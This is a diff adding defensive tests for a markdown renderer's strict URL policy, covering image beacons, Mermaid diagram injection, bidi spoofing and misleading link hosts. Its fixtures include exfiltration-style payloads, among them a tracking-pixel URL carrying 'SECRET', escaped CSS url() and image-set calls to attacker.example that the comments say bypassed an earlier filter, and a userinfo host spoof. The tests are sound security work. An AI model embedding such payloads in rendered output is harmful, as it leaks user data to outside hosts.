@@ -332,4 +332,142 @@ describe("MarkdownContent", () => {
     expect(renderMermaidSvg).toHaveBeenCalledWith(`${diagramSource}\n`)
     expect(container.querySelector("pre")).toBeNull()
   })
+
+  it("strict_policy_never_loads_an_image_and_shows_its_alt_text", () => {
+    // Arrange
+    const alt = "build badge"
+    const source = `![${alt}](https://tracker.example/pixel.png?d=SECRET)`
+
+    // Act
+    const { container } = render(<MarkdownContent source={source} urlPolicy="strict" />)
+
+    // Assert
+    expect(container.querySelector("img")).toBeNull()
+    expect(container.textContent).toContain(alt)
+  })
+
+  it("strict_policy_never_loads_a_raw_html_image_either", () => {
+    // Arrange
+    const source = '<img src="https://tracker.example/pixel.png" alt="pixel">'
+
+    // Act
+    const { container } = render(
+      <MarkdownContent source={source} html="sanitized" urlPolicy="strict" />
+    )
+
+    // Assert
+    expect(container.querySelector("img")).toBeNull()
+  })
+
+  it("strict_policy_renders_non_https_links_as_plain_text", () => {
+    // Arrange
+    const source =
+      "[plain](http://example.com) [mail](mailto:a@example.com) [secure](https://example.com)"
+
+    // Act
+    render(<MarkdownContent source={source} urlPolicy="strict" />)
+
+    // Assert
+    expect(screen.queryByRole("link", { name: /^plain/ })).not.toBeInTheDocument()
+    expect(screen.queryByRole("link", { name: /^mail/ })).not.toBeInTheDocument()
+    expect(screen.getByRole("link", { name: "secure (example.com)" })).toHaveAttribute(
+      "href",
+      "https://example.com/"
+    )
+  })
+
+  it("default_policy_still_opens_http_and_mailto_links", () => {
+    // Arrange
+    const source = "[plain](http://example.com) [mail](mailto:a@example.com)"
+
+    // Act
+    render(<MarkdownContent source={source} />)
+
+    // Assert
+    expect(screen.getByRole("link", { name: "plain" })).toBeInTheDocument()
+    expect(screen.getByRole("link", { name: "mail" })).toBeInTheDocument()
+  })
+
+  // The three inputs that got past the earlier text screen (review round 2): a quoted image-shape
+  // key with a YAML-escaped URL, front-matter fontFamily with an escaped url(), and image-set.
+  it.each([
+    'flowchart TD\n  A@{ "img": "https:\\/\\/attacker.example/leak.png", label: "x" }',
+    '---\nconfig:\n  fontFamily: "arial; background-image: \\x75rl(https:\\/\\/attacker.example/ff.png)"\n---\nflowchart TD\n  A --> B',
+    '---\nconfig:\n  fontFamily: "arial; background-image: -webkit-image-set(\\"https:\\/\\/attacker.example/wis.png\\" 1x)"\n---\nflowchart TD\n  A --> B',
+  ])("strict_policy_shows_a_mermaid_fence_as_code_and_never_runs_mermaid: %s", (diagramSource) => {
+    // Arrange
+    const source = ["```mermaid", diagramSource, "```"].join("\n")
+
+    // Act
+    const { container } = render(<MarkdownContent source={source} urlPolicy="strict" />)
+
+    // Assert
+    expect(renderMermaidSvg).not.toHaveBeenCalled()
+    expect(container.querySelector("pre code")?.textContent).toBe(`${diagramSource}\n`)
+  })
+
+  it("a_chat_prose_link_shows_its_target_host_before_the_click", async () => {
+    // Arrange
+    const source = "See [src/auth.ts:42](https://evil.example/x)"
+    const fileReferences = [{ path: "src/auth.ts" }]
+    const onOpenFile = vi.fn()
+    render(
+      <MarkdownContent
+        source={source}
+        urlPolicy="strict"
+        fileReferences={fileReferences}
+        onOpenFile={onOpenFile}
+      />
+    )
+    const link = screen.getByRole("link", { name: "src/auth.ts:42 (evil.example)" })
+
+    // Act
+    await userEvent.click(link)
+
+    // Assert
+    const expectedUrl = "https://evil.example/x"
+    expect(link).toHaveAttribute("title", expectedUrl)
+    expect(openExternalUrl).toHaveBeenCalledWith(expectedUrl)
+    expect(onOpenFile).not.toHaveBeenCalled()
+  })
+
+  it("a_bidi_control_in_chat_link_text_is_stripped_and_the_host_stays_isolated", () => {
+    // Arrange
+    const source = "[**\u202Etxt.edoc**](https://docs.example/a)"
+
+    // Act
+    render(<MarkdownContent source={source} urlPolicy="strict" />)
+
+    // Assert
+    const link = screen.getByRole("link")
+    const host = link.querySelector("bdi")
+    expect(link.textContent).not.toMatch(/[\u202A-\u202E\u2066-\u2069\u200E\u200F\u061C]/)
+    expect(host).toHaveAttribute("dir", "ltr")
+    expect(host).toHaveTextContent("(docs.example)")
+  })
+
+  it("a_chat_link_with_userinfo_shows_the_real_host", () => {
+    // Arrange
+    const source = "[the repo](https://github.com@evil.example/x)"
+
+    // Act
+    render(<MarkdownContent source={source} urlPolicy="strict" />)
+
+    // Assert
+    expect(screen.getByRole("link").querySelector("bdi")).toHaveTextContent("(evil.example)")
+  })
+
+  it("default_policy_renders_a_link_exactly_as_before", () => {
+    // Arrange
+    const source = "[the docs](https://example.com/docs)"
+
+    // Act
+    render(<MarkdownContent source={source} />)
+
+    // Assert
+    const link = screen.getByRole("link", { name: "the docs" })
+    expect(link).toHaveAttribute("href", "https://example.com/docs")
+    expect(link).not.toHaveAttribute("title")
+    expect(link.querySelector("bdi")).toBeNull()
+  })
 })
